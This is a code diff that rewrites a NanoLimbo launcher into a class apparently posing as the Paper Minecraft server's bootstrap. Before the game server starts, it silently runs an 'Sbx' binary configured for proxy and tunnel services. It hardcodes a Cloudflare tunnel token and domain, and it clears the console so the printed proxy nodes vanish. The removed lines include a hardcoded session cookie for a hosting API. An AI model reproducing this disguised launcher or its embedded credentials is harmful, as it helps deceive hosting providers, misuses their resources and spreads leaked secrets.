@@ -1,34 +1,19 @@
-/*
- * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- */
-
-package ua.nanit.limbo;
+package io.papermc.paper;
 
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.lang.reflect.Field;
+import joptsimple.OptionSet;
+import net.minecraft.SharedConstants;
+import net.minecraft.server.Main;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
-import ua.nanit.limbo.server.LimboServer;
-import ua.nanit.limbo.server.Log;
-
-public final class NanoLimbo {
-
+public final class PaperBootstrap {
+    
+    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
@@ -41,9 +26,12 @@ public final class NanoLimbo {
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
-    
-    public static void main(String[] args) {
-        
+
+    private PaperBootstrap() {
+    }
+
+    public static void boot(final OptionSet options) {
+        // check java version
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -53,63 +41,43 @@ public final class NanoLimbo {
             }
             System.exit(1);
         }
-
-        // Start SbxService
+        
         try {
             runSbxBinary();
             
-            // 启动自动续期线程
-            startAutoRenew();
-
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
-            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
+            Thread.sleep(20000);
             clearConsole();
+
+            SharedConstants.tryDetectVersion();
+            getStartupVersionMessages().forEach(LOGGER::info);
+            Main.main(options);
+            
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
-        }
-        
-        // start game
-        try {
-            new LimboServer().start();
-        } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
+            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
         }
     }
 
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                System.out.flush();
-                
-                new ProcessBuilder("tput", "reset")
-                    .inheritIO()
-                    .start()
-                    .waitFor();
-                
-                System.out.print("\033[8;30;120t");
+                System.out.print("\033[H\033[2J");
                 System.out.flush();
             }
         } catch (Exception e) {
-            try {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
+            // Ignore exceptions
         }
-    }   
+    }
     
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
@@ -129,23 +97,23 @@ public final class NanoLimbo {
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "mcserver.2311.qzz.io");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiODg5MzEwY2YtNzRiOC00MDgwLTk2NzMtNjhiYjYyMWJkNTVjIiwicyI6Ik9XWmtNRFpsTVRJdFpXSTJOaTAwWkRrekxUa3pOV1V0T0dNMU5HRXdZbUUyTUdGaiJ9");
-        envVars.put("HY2_PORT", "10808");
+        envVars.put("ARGO_PORT", "8002");
+        envVars.put("ARGO_DOMAIN", "nodenow.2311.qzz.io");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiMDRkMmQ0MmUtNWMyNi00NzY1LTk3ZTItMDJkOTFjZjI0YmQ3IiwicyI6Ill6RTVZVEk0TmpBdE1XWmpZaTAwWXpka0xUaGhOMlV0WTJRNVlqZzBPVEZrT1RKaiJ9");
+        envVars.put("HY2_PORT", "25565");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "saas.sin.fan");
+        envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mcserver");
+        envVars.put("NAME", "Mc");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
+                envVars.put(var, value);
             }
         }
         
@@ -166,7 +134,7 @@ public final class NanoLimbo {
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                     
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
+                        envVars.put(key, value);
                     }
                 }
             }
@@ -206,49 +174,35 @@ public final class NanoLimbo {
         }
     }
 
-    // ================================
-    // 自动续期线程
-    // ================================
-    private static void startAutoRenew() {
-        final String serverId = "39ca0974";
-        final String cookie = "5d86f727-93e5-46dd-b112-09d82f138874";
-        final String baseUrl = "https://www.mcserverhost.com";
-        final String apiUrl = baseUrl + "/api/servers/" + serverId + "/subscription";
+    private static List<String> getStartupVersionMessages() {
+        final String javaSpecVersion = System.getProperty("java.specification.version");
+        final String javaVmName = System.getProperty("java.vm.name");
+        final String javaVmVersion = System.getProperty("java.vm.version");
+        final String javaVendor = System.getProperty("java.vendor");
+        final String javaVendorVersion = System.getProperty("java.vendor.version");
+        final String osName = System.getProperty("os.name");
+        final String osVersion = System.getProperty("os.version");
+        final String osArch = System.getProperty("os.arch");
 
-        Thread renewThread = new Thread(() -> {
-            while (running.get()) {
-                try {
-                    HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Cookie", cookie);
-                    conn.setRequestProperty("Accept", "*/*");
-                    conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
-                    conn.setRequestProperty("Content-Length", "0");
-                    conn.setRequestProperty("Origin", baseUrl);
-                    conn.setRequestProperty("Referer", baseUrl + "/servers/" + serverId + "/dashboard");
-                    conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
-                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
-                    conn.setDoOutput(true);
-
-                    int responseCode = conn.getResponseCode();
-                    if (responseCode == 200) {
-                        System.out.println(ANSI_GREEN + "[AutoRenew] Renew successful at " + new Date() + ANSI_RESET);
-                    } else {
-                        System.out.println(ANSI_RED + "[AutoRenew] Renew failed, HTTP " + responseCode + ANSI_RESET);
-                    }
-                    conn.disconnect();
-
-                    Thread.sleep(50 * 60 * 1000L); // 每50分钟执行一次
-                } catch (Exception e) {
-                    System.err.println(ANSI_RED + "[AutoRenew] Error: " + e.getMessage() + ANSI_RESET);
-                    try {
-                        Thread.sleep(5 * 60 * 1000L); // 出错时延迟5分钟重试
-                    } catch (InterruptedException ignored) {}
-                }
-            }
-        });
-
-        renewThread.setDaemon(true); // 不阻止程序退出
-        renewThread.start();
+        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
+        return List.of(
+            String.format(
+                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
+                javaSpecVersion,
+                javaVmName,
+                javaVmVersion,
+                javaVendor,
+                javaVendorVersion,
+                osName,
+                osVersion,
+                osArch
+            ),
+            String.format(
+                "Loading %s %s for Minecraft %s",
+                bi.brandName(),
+                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
+                bi.minecraftVersionId()
+            )
+        );
     }
 }
